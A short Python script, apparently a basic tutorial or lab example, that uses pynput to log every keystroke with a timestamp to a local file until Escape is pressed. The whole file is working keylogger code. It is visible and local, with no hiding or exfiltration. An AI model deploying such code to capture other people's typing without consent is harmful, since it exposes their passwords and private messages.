from pynput import keyboard
import os
from datetime import datetime

# Set the log file
LOG_FILE = "keylog.txt"

def write_to_file(key):
    with open(LOG_FILE, "a") as f:
        f.write(f"{datetime.now()} - {key}\n")

def on_press(key):
    try:
        # Record character keys
        write_to_file(f"Key Pressed: {key.char}")
    except AttributeError:
        # Record special keys (e.g., Enter, Shift)
        write_to_file(f"Special Key Pressed: {key}")

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener on Escape key
        return False

# Start listening
print("Keylogger started. Press ESC to stop...")
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
